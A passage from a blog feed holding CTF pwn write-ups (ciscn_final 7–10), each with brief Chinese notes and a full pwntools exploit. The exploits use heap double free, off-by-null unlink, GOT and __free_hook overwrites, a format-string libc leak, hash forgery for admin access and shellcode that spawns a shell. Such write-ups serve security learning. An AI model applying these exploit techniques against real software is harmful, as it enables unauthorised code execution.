done</span><br><span class="line">    120 &#x3D;&#x3D;&gt; simply write something on the stack (no use at all)</span><br><span class="line">    238 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : index</span><br><span class="line">            free the chunk that recently malloc (pointer will not be reset to 0, </span><br><span class="line">            thus bring double free)</span><br><span class="line">    386 &#x3D;&#x3D;&gt; simply exit</span><br><span class="line"></span><br><span class="line">some global variable:</span><br><span class="line">    0x605AC0 &#x3D;&#x3D;&gt; store the address of the chunk_array </span><br><span class="line">    0x604940 &#x3D;&#x3D;&gt; store the address of the present chunk</span><br><span class="line">    0x6040E0 &#x3D;&#x3D;&gt; store the times that &quot;free&quot; can be used (initialize to 4), if use up,</span><br><span class="line">                 the process will print out the chunk_array and simply exit</span><br><span class="line"></span><br><span class="line">some constraints:</span><br><span class="line">    chunk size should satisfy &quot;size &gt; 0 &amp;&amp; size &lt;&#x3D; 0x7F&quot;</span><br><span class="line">    can only malloc at most 10 chunks (according to the free space in chunk_array)</span><br><span class="line">    for &quot;238&quot;(free) function, index should satisfy &quot;index &gt;&#x3D; 0 &amp;&amp; index &lt;&#x3D; 9&quot;</span><br><span class="line">    &quot;238&quot;(free) function can only be used 4 times (according to the value stored in 0x6040E0)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">offset &#x3D; 0x21b97</span><br><span class="line">system_offset &#x3D; libc.symbols[&quot;system&quot;]</span><br><span class="line">atoi_got &#x3D; elf.got[&quot;atoi&quot;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">bss &#x3D; elf.bss(0x1500)</span><br><span class="line">chunk_array_addr &#x3D; 0x605AC0</span><br><span class="line">delete_times_addr &#x3D; 0x6040e0</span><br><span class="line"></span><br><span class="line"># double free</span><br><span class="line">new(0x28, &#39;AAAA&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">new(0x38, &#39;BBBB&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line"># set the delete time to 0xAAA</span><br><span class="line">new(0x28, p64(delete_times_addr)) </span><br><span class="line">new(0x28, &#39;AAAA&#39;) </span><br><span class="line">new(0x28, p64(0xAAA))</span><br><span class="line"></span><br><span class="line"># reset the chunk_array</span><br><span class="line">new(0x38, p64(chunk_array_addr)) </span><br><span class="line">new(0x38, &#39;AAAA&#39;) </span><br><span class="line">new(0x38, p64(bss))</span><br><span class="line"></span><br><span class="line"># double free</span><br><span class="line">new(0x48, &quot;CCCC&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">new(0x58, &quot;DDDD&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line"># write aoti_got to printf_plt</span><br><span class="line">new(0x48, p64(atoi_got)) </span><br><span class="line">new(0x48, &#39;AAAA&#39;) </span><br><span class="line">new(0x48, p64(printf_plt)) </span><br><span class="line"></span><br><span class="line"># leak libc</span><br><span class="line">p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%25$p&quot;)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_addr &#x3D; int(p.recv(14)[2:], 16)</span><br><span class="line">libc_base &#x3D; libc_addr - offset</span><br><span class="line">libc_system &#x3D; libc_base + system_offset</span><br><span class="line"></span><br><span class="line"># write atoi_got to system</span><br><span class="line">new(0x58, p64(atoi_got), True)</span><br><span class="line">new(0x58, &quot;DDDD&quot;, True)</span><br><span class="line">new(0x58, p64(libc_system), True)</span><br><span class="line"></span><br><span class="line"># system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">success(&quot;libc_system: &quot; + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="ciscn-final-8"><a href="#ciscn-final-8" class="headerlink" title="ciscn_final_8"></a>ciscn_final_8</h1><h2 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2><p>乍一看好像挺复杂的，其实仔细看看逻辑挺简单的（但是我还是花了蛮久时间的，太菜了）。</p><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ol><li>在<code>login</code>之后，输入<code>text</code>的长度是可控的而且没有限制，故存在溢出。</li><li>在<code>register</code>一个<code>user</code>的时候，会先对输入的<code>password</code>进行SM3散列计算再储存，然后在输入完<code>text</code>之后，对所有的元数据（包括<code>user</code>的名字，<code>password length</code>，<code>password</code>散列，<code>text_len</code>，<code>text</code>）再进行一次SM3散列计算并储存。</li><li>之后的每次<code>login</code>都会对这两个散列进行检查。</li><li>利用<code>user0</code>的溢出将<code>user1</code>特定的<code>password</code>散列leak出来（比如”0”)。</li><li>利用leak出来的<code>password</code>散列，伪造<code>user2</code>用户输入的<code>password</code>为<code>admin2</code>所有元数据（包括名字<code>admin2</code>，<code>password length</code>（1），<code>password</code>散列（之前leak出来的”0”的散列），<code>text_len</code>，<code>text</code>），该元数据的散列值将会被储存在<code>user2</code>的区域。</li><li>利用<code>user1</code>的溢出leak出上述提到的<code>admin2</code>的所有元数据的散列。</li><li>再次利用<code>user1</code>的溢出覆盖<code>user2</code>为伪造的superuser也就是<code>admin2</code>。</li><li>以<code>user2</code>的身份<code>login</code>，此时便能通过superuser也就是<code>admin2</code>的check条件，达到调用<code>getflag</code>功能的目的。</li></ol><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(age, passwd_len, passwd, content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please set your age:"</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id, passwd_len, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, input your id"</span>, str(id))</span><br><span class="line">    p.sendlineafter(<span class="string">"length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_content</span><span class="params">(content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># register two user</span></span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># restore the second user</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x40</span> + <span class="string">'\x00'</span> * <span class="number">0x4</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>) + p32(<span class="number">1</span>) + <span class="string">"user1"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>, <span class="string">"\x00"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test the second user</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"><span class="comment"># login(1, 1, "0")</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reigster the third user</span></span><br><span class="line">password = p64(<span class="number">2</span>) + p32(<span class="number">1</span>) + <span class="string">"admin"</span></span><br><span class="line">password += <span class="string">"2"</span></span><br><span class="line">password = password.ljust(<span class="number">0x24</span>, <span class="string">"\x00"</span>)</span><br><span class="line">password += digest</span><br><span class="line">password += <span class="string">"0"</span></span><br><span class="line">password = password.ljust(<span class="number">0x64</span>, <span class="string">"\x00"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">0x64</span>, password, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">1</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake the third user as admin</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x4C</span></span><br><span class="line">payload += password</span><br><span class="line">payload += digest</span><br><span class="line">set_content(<span class="number">0x84</span> + <span class="number">0x4C</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login as admin</span></span><br><span class="line">quit()</span><br><span class="line">login(<span class="number">2</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getflag</span></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-9"><a href="#ciscn-final-9" class="headerlink" title="ciscn_final_9"></a>ciscn_final_9</h1><h2 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h2><p>明显的off by null，通过unlink形成chunk overlap，因为看错了<code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))</code>判断条件一度怀疑人生（甚至怀疑以前怎么做unlink的）。</p><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><ol><li>分配所有10个chunk，将后面的7个chunk释放并填满tcache bin。</li><li>剩下的三个chunk通过off by null形成chunk overlap，需要满足相应的<code>fd</code>，<code>bk</code>，<code>prev_size</code>字段。</li><li>由于”\x00\x02”(<code>prev_size=0x200</code>)无法直接写进去，这里需要连续释放剩下的3个chunk，使得第三个chunk的<code>prev_size</code>会被写入<code>0x200</code>。</li><li>将所有10个chunk又全部从bin中分配出来。</li><li>释放除了3个上述提到的unsorted bin之外的7个chunk中的6个，以填充6个tcache bin的位置。</li><li>将3个unsorted bin中位于中间位置的chunk释放到tcache bin中，从而下一次分配就能分配到该chunk，将size设置为<code>0x78</code>从而覆盖第三个unsorted bin的<code>prev_inuse</code>标志位为0。</li><li>再次将tcache bin重新填满，释放第一个unsorted bin，满足<code>fd</code>和<code>bk</code>的约束。</li><li>此时再次释放第三个unsorted bin，此时触发unlink，获得0x300的unsorted bin，第二个unsorted bin被overlap，从而可以被二次分配。</li><li>之后就利用tcache double free，写<code>__free_hook</code>为onegadget，触发<code>free</code>来getshell。</li></ol><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size \n&gt; "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"content \n&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a38c</span></span><br><span class="line">one_gadget_offset = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">4</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># put chunk 7 into unsorted bin</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"CCCC\n"</span>) <span class="comment"># leave one tacache bin for chunk 8</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment"># put chunk 8 into tcache bin</span></span><br><span class="line">new(<span class="number">0xF8</span>, <span class="string">"DDDD\n"</span>) <span class="comment"># off by null to chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fill tcache bin</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># take all tcache bin out</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"EEEE\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"FFFF\n"</span>) <span class="comment"># chunk 8</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"GGGG\n"</span>) <span class="comment"># chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># prepare enough space</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(__free_hook)) <span class="comment"># chunk 0</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(one_gadget)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-10"><a href="#ciscn-final-10" class="headerlink" title="ciscn_final_10"></a>ciscn_final_10</h1><h2 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h2><p>这个应该巨简单了，根本没难点。</p><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><ol><li>首先要通过check才能进行后续操作，随机数肯定是才不到的，后续只要输入一个低2 bytes为0的负数就能通过check了。</li><li>后面就是明显的tcache double free。</li><li>通过partial write tcache bin，分配到储存<code>The cake is not a lie!</code>的chunk，将其改写为<code>The cake is a lie!</code>。</li><li>之后输入一个无效选项（比如3）触发后续接受输入，在对该输入进行简单的异或操作后当作指令执行的功能。</li><li>对shellcode进行对应的处理之后作为输入，然后就能getshell了。</li></ol><h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    shellcode = [ord(item) <span class="keyword">for</span> item <span class="keyword">in</span> shellcode][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            payload += chr(shellcode[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += chr(ord(payload[i - <span class="number">1</span>]) ^ shellcode[i])</span><br><span class="line">    <span class="keyword">return</span> payload[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get access right</span></span><br><span class="line">access()</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># change str</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"\x90"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"The cake is a lie!\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send shellcode</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt; "</span>, gen_shellcode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwnable.tw做不动了，发现BUUOJ上的题目挺多的，加上想刷一刷2019国赛的题目，这两天断断续续地做了几道题目，简单记录一下。&lt;br&gt;&lt;br&gt;&lt;b&gt;更新：10道刷完，有些题目还是挺有意思的。&lt;/b&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn fsb: printable</title>
    <link href="https://n0nop.github.io/2020/04/21/pwn-fsb-printable/"/>
    <id>https://n0nop.github.io/2020/04/21/pwn-fsb-printable/</id>
    <published>2020-04-21T03:25:00.000Z</published>
    <updated>2020-04-21T04:56:15.317Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 